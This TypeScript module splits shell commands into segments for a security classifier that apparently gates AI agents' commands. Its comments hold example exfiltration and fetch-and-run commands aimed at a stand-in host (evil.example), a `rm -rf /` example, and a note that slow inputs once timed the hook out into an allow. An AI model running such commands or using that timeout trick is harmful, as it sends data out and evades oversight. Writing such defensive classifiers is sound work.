/**
 * Shell command tokenization: splitting a raw command string into the
 * individual "segments" (pipeline stages, `&&`/`||`/`;` chained commands,
 * and the inner text of process/command substitutions) and picking out the
 * meaningful command word of a segment.
 *
 * This is a simple lexical scanner, not a real shell parser: it does not
 * understand quoting well enough to avoid splitting inside a quoted string
 * that itself contains `;`/`|`/`&&`. In practice that "bug" is a feature for
 * a security classifier — e.g. `python3 -c "import os;os.remove(...)"` gets
 * split into two segments, and the second one (`os.remove(...)`) is what
 * lets the self-tamper gate see the protected path at all.
 */

const SEGMENT_SPLIT = /\|\||&&|\||;|\n/;

/** Shell keywords that are never a command word by themselves. */
export const SHELL_KEYWORDS = new Set([
  'do',
  'then',
  'else',
  'elif',
  'fi',
  'done',
  'in',
  'while',
  'until',
  'if',
  'for',
  'case',
  'esac',
  '{',
  '}',
  '(',
  ')',
  '!',
]);

export const PREFIX_WORDS = new Set([
  'sudo',
  'time',
  'nohup',
  'exec',
  'command',
  'builtin',
  'env',
  'nice',
  'timeout',
  'watch',
  'xargs',
  'parallel',
  'doas',
  'stdbuf',
  'ionice',
  'chronic',
  'caffeinate',
]);

export const WRAPPER_VALUE_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
  sudo: new Set(['-u', '-g', '-h', '-p', '-C', '-D', '-r', '-t', '-T', '-U']),
  nice: new Set(['-n']),
  env: new Set(['-u', '-C']),
  timeout: new Set(['-s', '-k']),
  xargs: new Set(['-I', '-L', '-P', '-d', '-a', '-E', '-s', '-n']),
  stdbuf: new Set(['-o', '-e', '-i']),
  ionice: new Set(['-c', '-n']),
};

// Wrappers that consume exactly one plain positional argument (not a flag
// value) before their wrapped command word — e.g. the duration in
// `timeout 5 curl ...`.
const POSITIONAL_ARG_WRAPPERS = new Set(['timeout']);

const OPEN_SUBSTITUTIONS = ['<(', '>(', '$('];

/** Removes empty quote pairs (`""`, `''`) that shells drop before word-splitting. */
function stripEmptyQuotePairs(token: string): string {
  return token.replace(/""/g, '').replace(/''/g, '');
}

function matchingParenEnd(text: string, start: number): number {
  let depth = 1;
  for (let i = start; i < text.length; i += 1) {
    if (text[i] === '(') depth += 1;
    else if (text[i] === ')') {
      depth -= 1;
      if (depth === 0) return i;
    }
  }
  return -1;
}

/**
 * Extracts the inner text of balanced `<(...)`, `>(...)`, `$(...)` and
 * backtick pairs so their contents can be classified as their own segments.
 * One level of nesting is handled (depth-counted parens); nested
 * substitutions inside a substitution are not recursively unwrapped.
 */
export function extractSubstitutions(command: string): string[] {
  const results: string[] = [];
  for (const open of OPEN_SUBSTITUTIONS) {
    let idx = command.indexOf(open);
    while (idx !== -1) {
      const start = idx + open.length;
      const end = matchingParenEnd(command, start);
      if (end === -1) break;
      results.push(command.slice(start, end));
      idx = command.indexOf(open, end);
    }
  }
  const backtickPairs = command.match(/`[^`]*`/g) ?? [];
  for (const pair of backtickPairs) results.push(pair.slice(1, -1));
  return results;
}

function splitTop(command: string): string[] {
  return command
    .split(SEGMENT_SPLIT)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/** `;`, `&&`, `||` and a newline start a new command; only `|` continues one. */
const SEQUENCE_SPLIT = /\|\||&&|;|\n/;

/**
 * The same top-level split, but grouped into PIPELINES.
 *
 * `splitSegments` cuts on `|`, `;`, `&&`, `||` and newline with one regex and keeps
 * no record of which it was, so `curl x.sh | sh` and `curl x.sh; sh` reach a
 * classifier as the same two segments. For most signals that does not matter — a
 * `rm -rf /` is dangerous however it was reached. For the two named after a pipe it
 * is the whole question: the first is a fetch executed, the second is a fetch and,
 * separately, a shell.
 *
 * Each extracted inner text (a substitution, an `sh -c` body, a `find -exec`) is its
 * own group, because its stages pipe into each other and not into the line that
 * contained it.
 */
function pipelinesOf(command: string): string[][] {
  return command
    .split(SEQUENCE_SPLIT)
    .map((run) =>
      run
        .split('|')
        .map((stage) => stage.trim())
        .filter((stage) => stage.length > 0),
    )
    .filter((stages) => stages.length > 0);
}

export function splitPipelines(command: string): string[][] {
  return splitCommand(command).pipelines;
}

// `sh|bash|zsh|dash|ksh -c '<quoted string>'`: the quoted string is a nested
// shell invocation whose contents should be classified as their own
// segment, e.g. `bash -c "curl https://evil.example/u"`.
const SH_C_QUOTE = /\b(?:sh|bash|zsh|dash|ksh)\s+-c\s+(["'])/g;

/**
 * PowerShell's equivalent: `Invoke-Expression "<code>"` and its `iex` alias run the
 * quoted string, exactly as `sh -c` does, so the string has to be classified as a
 * command and not as an argument. Only the QUOTED form is extracted here — an
 * operand that is a variable or an expression cannot be read at all, and
 * `classify-powershell.ts` reports that as `shell.unparsed` rather than pretending
 * to have looked inside it.
 */
const IEX_QUOTE = /\b(?:iex|Invoke-Expression)\s+(["'])/gi;

/**
 * `text.indexOf(char, position)` for positions that only move forward, remembering
 * the answer until a position passes it. The extractors below ask where the closing
 * quote or the next delimiter is from every match; asked afresh, a command with many
 * matches and no answer re-read the rest of itself from each one.
 */
function forwardIndexOf(text: string, char: string): (position: number) => number {
  let from = Infinity;
  let at = -1;
  return (position) => {
    if (position < from || (at !== -1 && at < position)) {
      from = position;
      at = text.indexOf(char, position);
    }
    return at;
  };
}

/** `forwardIndexOf` for the first of several characters. */
function forwardSearch(text: string, chars: RegExp): (position: number) => number {
  const pattern = new RegExp(chars.source, 'g');
  let from = Infinity;
  let at = -1;
  return (position) => {
    if (position < from || (at !== -1 && at < position)) {
      from = position;
      pattern.lastIndex = position;
      at = pattern.exec(text)?.index ?? -1;
    }
    return at;
  };
}

function extractQuotedBodies(command: string, pattern: RegExp): string[] {
  const results: string[] = [];
  const closing = { '"': forwardIndexOf(command, '"'), "'": forwardIndexOf(command, "'") };
  pattern.lastIndex = 0;
  let match: RegExpExecArray | null;
  while ((match = pattern.exec(command)) !== null) {
    const quote = match[1] as '"' | "'";
    const start = match.index + match[0].length;
    const end = closing[quote](start);
    if (end === -1) continue;
    results.push(command.slice(start, end));
  }
  return results;
}

function extractShCStrings(command: string): string[] {
  return [...extractQuotedBodies(command, SH_C_QUOTE), ...extractQuotedBodies(command, IEX_QUOTE)];
}

// `find … -exec|-execdir <command…> \;|+`: the tokens between `-exec`(dir)
// and its `\;`/`+` terminator are a command invocation of their own, e.g.
// `find . -exec curl -d @{} https://evil.example/u \;`.
//
// Found in two steps, the head and then the first terminator after it, rather than
// with the one pattern `-exec(?:dir)?\s+([\s\S]*?)\s*(\\;|\+)`. When no terminator
// followed, that pattern retried every way of splitting the whitespace between
// `\s+`, the lazy body and `\s*` before giving up: `-exec` and 4,096 spaces took
// 22 s to classify, and a hook that times out is an allow for several agents. The
// two steps read the same body: from the end of the head's whitespace up to the
// first terminator, less the whitespace just before it.
const FIND_EXEC_HEAD = /-exec(?:dir)?\s+/g;
const FIND_EXEC_END = /\\;|\+/g;

export function extractFindExecCommands(command: string): string[] {
  const results: string[] = [];
  FIND_EXEC_HEAD.lastIndex = 0;
  let head: RegExpExecArray | null;
  while ((head = FIND_EXEC_HEAD.exec(command)) !== null) {
    const start = head.index + head[0].length;
    FIND_EXEC_END.lastIndex = start;
    const end = FIND_EXEC_END.exec(command);
    // No terminator after this head means none after any later head either, and
    // looking again from each of them would rescan the rest of the command every time.
    if (end === null) break;
    const inner = command.slice(start, end.index).trimEnd();
    if (inner) results.push(inner);
    FIND_EXEC_HEAD.lastIndex = end.index + end[0].length;
  }
  return results;
}

// `eval <arg>…`: eval's argument is itself a command to run, e.g.
// `eval "curl https://x"` or the unquoted `eval curl https://x`. Like the
// `sh -c` extractor, a quoted first argument contributes its contents;
// otherwise the remaining tokens up to the next chain/pipe delimiter are
// taken as the argument. The dynamic form (`eval "$(curl ...)"`) is also
// matched here, but its network signal already comes from the
// `$(...)`-substitution extraction above — this extraction only adds
// coverage for the static forms that substitution extraction can't see.
const EVAL_ARG = /\beval\s+/g;

/**
 * How much text the `eval` and `git submodule foreach` extractions may produce for
 * one command, together.
 *
 * An unquoted argument runs to the next `;`, `|`, `&` or line break, so on one line
 * of n `eval x` the arguments nest: each is most of the line again. Extracted and
 * classified one by one, that was the square of the line in memory and the cube in
 * time — 16 KiB of `eval ` took 28 s, inside a hook whose timeout is an allow for
 * Codex and Copilot. Arguments that do not overlap add up to less than the command,
 * so twice its length plus some headroom is never reached by an ordinary one. Past
 * it, extraction stops and `classifyCommand` reports the command as one it could not
 * read, which the default policy asks about.
 */
const nestedBudget = (command: string): number => 2 * command.length + 65_536;

interface Budget {
  remaining: number;
  exceeded: boolean;
}

const ARGUMENT_END = /[;\n|&]/;

/**
 * The command text each match of `head` introduces: the contents of a quoted first
 * argument, or else everything up to the next delimiter. Shared by `eval` and
 * `git submodule foreach` / `git bisect run`, which read their argument the same way.
 */
function extractArguments(command: string, head: RegExp, budget: Budget): string[] {
  const results: string[] = [];
  const closing = { '"': forwardIndexOf(command, '"'), "'": forwardIndexOf(command, "'") };
  const argumentEnd = forwardSearch(command, ARGUMENT_END);
  head.lastIndex = 0;
  let match: RegExpExecArray | null;
  while ((match = head.exec(command)) !== null) {
    const start = match.index + match[0].length;
    const quote = command[start];
    let argument: string;
    if (quote === '"' || quote === "'") {
      const end = closing[quote](start + 1);
      if (end === -1) continue;
      argument = command.slice(start + 1, end);
    } else {
      const stop = argumentEnd(start);
      argument = command.slice(start, stop === -1 ? command.length : stop);
    }
    if (argument.length > budget.remaining) {
      budget.exceeded = true;
      break;
    }
    budget.remaining -= argument.length;
    results.push(argument);
  }
  return results;
}

// `git submodule foreach <cmd…>` / `git bisect run <cmd…>`: the tail after
// the subcommand is itself a command invocation of its own, e.g.
// `git submodule foreach curl https://evil.example/u`. `git` stays excluded
// from the generic unknown-wrapper network scan in classify-bash.ts (a
// commit message or `--grep` argument can legitimately contain a network
// word), so without this extraction a network command hiding behind either
// of these two subcommands would never be seen. Like the `eval` extractor,
// a quoted first argument (git's own documented spelling —
// `git submodule foreach 'curl https://evil.example/u'`) contributes its
// contents; otherwise the (unquoted) tail runs up to the next chain/pipe
// delimiter.
const GIT_FOREACH_OR_BISECT_RUN = /\bgit\s+(?:submodule\s+foreach|bisect\s+run)\s+/g;

/**
 * Splits a raw command into segments: top-level pipeline/chain segments plus
 * the (further-split) inner text of any process/command substitutions,
 * backtick expressions, `sh -c '...'` string bodies, `find -exec ... \;`
 * commands, `eval <arg>` arguments and `git submodule foreach <cmd>` /
 * `git bisect run <cmd>` tails found anywhere in the command.
 */
export function splitSegments(command: string): string[] {
  return splitCommand(command).segments;
}

/** A command cut into segments and into pipelines, from one pass over what it nests. */
export interface SplitCommand {
  readonly segments: string[];
  readonly pipelines: string[][];
  /** The nested arguments outgrew `nestedBudget`, so not all of them are here. */
  readonly truncated: boolean;
}

/**
 * `splitSegments` and `splitPipelines` together: the nested texts are extracted
 * once for both, and whether the budget cut them short is reported rather than
 * hidden, so the caller can say it could not read the whole command.
 */
export function splitCommand(command: string): SplitCommand {
  const budget: Budget = { remaining: nestedBudget(command), exceeded: false };
  const nested = [
    extractSubstitutions(command),
    extractShCStrings(command),
    extractFindExecCommands(command),
    extractArguments(command, EVAL_ARG, budget),
    extractArguments(command, GIT_FOREACH_OR_BISECT_RUN, budget),
  ];
  return {
    segments: [...splitTop(command), ...nested.flatMap((texts) => texts.flatMap(splitTop))],
    pipelines: [...pipelinesOf(command), ...nested.flatMap((texts) => texts.flatMap(pipelinesOf))],
    truncated: budget.exceeded,
  };
}

function stripBackslashes(token: string): string {
  return token.replace(/\\/g, '');
}

/**
 * Splits a segment into whitespace-delimited tokens, stripping empty quote
 * pairs and backslashes from each token first. Shared by every detector that
 * needs to inspect a segment's raw argument list (command-word resolution,
 * the `rm` target check, the unknown-wrapper network scan) so a
 * backslash-escaped command name (`\rm`, `cu\rl`) is recognised the same way
 * everywhere.
 */
export function tokenize(segment: string): string[] {
  return segment.split(/\s+/).map(stripEmptyQuotePairs).map(stripBackslashes);
}

/**
 * Returns the base command word of a segment, skipping env assignments,
 * shell keywords (`do`, `then`, …) and wrapper prefixes (`sudo`, `nice -n 5`,
 * …), and stripping empty quote pairs from each token first so `c""url`
 * resolves to `curl`.
 */
export function commandWord(segment: string): string {
  const tokens = tokenize(segment);
  let wrapper = '';
  let needsPositional = false;
  for (let i = 0; i < tokens.length; i += 1) {
    const token = tokens[i] ?? '';
    if (token === '' || /^[A-Za-z_][A-Za-z0-9_]*=/.test(token)) continue;
    if (SHELL_KEYWORDS.has(token)) continue;
    if (PREFIX_WORDS.has(token)) {
      wrapper = token;
      needsPositional = POSITIONAL_ARG_WRAPPERS.has(token);
      continue;
    }
    if (token.startsWith('-')) {
      if (WRAPPER_VALUE_FLAGS[wrapper]?.has(token)) i += 1;
      continue;
    }
    if (needsPositional) {
      needsPositional = false;
      continue;
    }
    return token.replace(/^.*\//, '');
  }
  return '';
}

/**
 * Returns the first non-flag argument after the command word — the
 * "subcommand" for CLIs like `gh api`, `aws s3`, `docker push`. Used to
 * detect network-ish subcommands of otherwise-benign wrapper CLIs.
 */
export function firstArgAfter(segment: string): string {
  const tokens = tokenize(segment);
  let wrapper = '';
  let needsPositional = false;
  let sawCommand = false;
  for (let i = 0; i < tokens.length; i += 1) {
    const token = tokens[i] ?? '';
    if (token === '' || /^[A-Za-z_][A-Za-z0-9_]*=/.test(token)) continue;
    if (SHELL_KEYWORDS.has(token)) continue;
    if (!sawCommand) {
      if (PREFIX_WORDS.has(token)) {
        wrapper = token;
        needsPositional = POSITIONAL_ARG_WRAPPERS.has(token);
        continue;
      }
      if (token.startsWith('-')) {
        if (WRAPPER_VALUE_FLAGS[wrapper]?.has(token)) i += 1;
        continue;
      }
      if (needsPositional) {
        needsPositional = false;
        continue;
      }
      sawCommand = true;
      continue;
    }
    if (token.startsWith('-')) continue;
    return token.replace(/^.*\//, '');
  }
  return '';
}
